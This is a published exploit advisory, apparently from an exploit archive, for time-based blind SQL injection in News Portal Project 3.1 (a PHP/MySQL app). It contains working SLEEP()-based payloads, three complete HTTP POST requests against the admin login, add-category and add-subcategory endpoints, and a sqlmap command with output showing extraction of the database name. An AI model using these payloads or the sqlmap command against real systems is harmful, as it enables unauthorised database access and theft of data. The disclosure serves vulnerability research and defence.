@@ -1,0 +1,135 @@
+id: 36581
+date: 07/21/2021
+title: News Portal Project 3.1 SQL Injection Vulnerability
+author: faisalfs10x
+cves: 
+
+# Exploit Title: News Portal Project - Multiple time-based SQL Injection
+# Exploit Author: faisalfs10x (https://github.com/faisalfs10x)
+# Vendor Homepage: https://phpgurukul.com
+# Software Link: https://phpgurukul.com/news-portal-project-in-php-and-mysql/
+# Version: 3.1
+# Tested on: Windows 10, XAMPP
+
+
+################
+# Description  #
+################
+
+# The system is vulnerable to time-based SQL injection on multiple endpoints. Based on the SLEEP(N) function payload that will sleep for a number of seconds used on the mentioned parameters below, the server response is about (N) seconds delay respectively which mean it is vulnerable to MySQL Blind (Time Based). An attacker can use sqlmap to further the exploitation for extracting sensitive information from the database.
+
+
+#####################
+# PoC of detection  #
+#####################
+
+
+PoC #1) param username - time-based SQLi
+Payload: ')+AND+(SELECT+1337+FROM+(SELECT(SLEEP(5)))FSX)--+
+Request: The response duration = 4934 bytes | 5,232 millis
+========'
+
+POST /newsportal/admin/ HTTP/1.1
+Host: localhost
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:89.0) Gecko/20100101 Firefox/89.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 82
+Origin: http://localhost
+DNT: 1
+Connection: close
+Referer: http://localhost/newsportal/admin/
+Cookie: last_views=a%3A2%3A%7Bi%3A0%3Bi%3A18%3Bi%3A1%3Bi%3A15%3B%7D; __atuvc=6%7C27; PHPSESSID=7vdqnnaqej9bd8bbp2fds6o950; sid7cc7e9c2=17at0fifkpb77doq1qe263dt8qfs3kor
+Upgrade-Insecure-Requests: 1
+Sec-GPC: 1
+
+username=admin')+AND+(SELECT+1337+FROM+(SELECT(SLEEP(5)))FSX)--+&password=s&login=
+
+---
+
+
+PoC #2) Two(2) param, category and description - time-based SQLi
+Payload: '+AND+(SELECT+1337+FROM+(SELECT(SLEEP(5)))HOLA)+AND+'rand'='ranm
+Request: Total response concurrently for 2 param (N=5+3) duration = 13,092 bytes | 8,040 millis
+========'
+
+POST /newsportal/admin/add-category.php HTTP/1.1
+Host: localhost
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:89.0) Gecko/20100101 Firefox/89.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 102
+Origin: http://localhost
+DNT: 1
+Connection: close
+Referer: http://localhost/newsportal/admin/add-category.php
+Cookie: last_views=a%3A2%3A%7Bi%3A0%3Bi%3A18%3Bi%3A1%3Bi%3A15%3B%7D; __atuvc=6%7C27; PHPSESSID=7vdqnnaqej9bd8bbp2fds6o950; sid7cc7e9c2=17at0fifkpb77doq1qe263dt8qfs3kor
+Upgrade-Insecure-Requests: 1
+Sec-GPC: 1
+
+category=Book'+AND+(SELECT+1337+FROM+(SELECT(SLEEP(5)))HOLA)+AND+'rand'='ranm&description=worm'+AND+(SELECT+1337+FROM+(SELECT(SLEEP(3)))YOLA)+AND+'rand'='ranm&submit=
+
+---
+
+
+PoC #3) Three (3) param, category,subcategory & sucatdescription - time-based SQLi
+Payload: '+AND+(SELECT+1337+FROM+(SELECT(SLEEP(N)))XXXX)+AND+'test'='ranm
+Request: Total response concurrently for 3 param (N=5+6+7) duration = 14,196 bytes | 18,042 millis
+========
+
+POST /newsportal/admin/add-subcategory.php HTTP/1.1
+Host: localhost
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:89.0) Gecko/20100101 Firefox/89.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 256
+Origin: http://localhost
+DNT: 1
+Connection: close
+Referer: http://localhost/newsportal/admin/add-subcategory.php
+Cookie: last_views=a%3A2%3A%7Bi%3A0%3Bi%3A18%3Bi%3A1%3Bi%3A15%3B%7D; __atuvc=6%7C27; PHPSESSID=7vdqnnaqej9bd8bbp2fds6o950; sid7cc7e9c2=17at0fifkpb77doq1qe263dt8qfs3kor
+Upgrade-Insecure-Requests: 1
+Sec-GPC: 1
+
+category=2'+AND+(SELECT+1337+FROM+(SELECT(SLEEP(5)))XXXX)+AND+'test'='ranm&subcategory=test'+AND+(SELECT+4444+FROM+(SELECT(SLEEP(6)))YYYY)+AND+'okay'='ranm&sucatdescription=test2'+AND+(SELECT+8080+FROM+(SELECT(SLEEP(7)))ZZZZ)+AND+'pwnn'='ranm&submitsubcat=
+
+---
+
+
+
+########################
+# PoC of exploitation  #
+########################
+
+# Run sqlmap to extract current database name:
+
+$ sqlmap -u "http://localhost/newsportal/admin/add-category.php" --data="category=test&description=test&submit=" --cookie="last_views=a%3A2%3A%7Bi%3A0%3Bi%3A18%3Bi%3A1%3Bi%3A15%3B%7D; __atuvc=6%7C27; PHPSESSID=7vdqnnaqej9bd8bbp2fds6o950; sid7cc7e9c2=17at0fifkpb77doq1qe263dt8qfs3kor" --delay=1 --timeout=30 --retries=3 -p "category" --dbms="MySQL" --level=5 --risk=3 --threads=10 --time-sec=5 -b --current-db --batch --answers="crack=N,dict=N,continue=Y,quit=N" --technique=T
+
+
+###########
+# Output  #
+###########
+
+
+[INFO] testing MySQL
+[INFO] confirming MySQL
+[INFO] the back-end DBMS is MySQL
+[INFO] fetching banner
+[INFO] retrieving the length of query output
+[INFO] resumed: 10.1.19-MariaDB
+web server operating system: Windows
+web application technology: PHP 5.6.24, Apache 2.4.23
+back-end DBMS: MySQL >= 5.0.0 (MariaDB fork)
+banner: '10.1.19-MariaDB'
+[INFO] fetching current database
+[INFO] retrieving the length of query output
+[INFO] resumed: newsportal
+current database: 'newsportal'
+
+#  0day.today [2023-03-27]  #
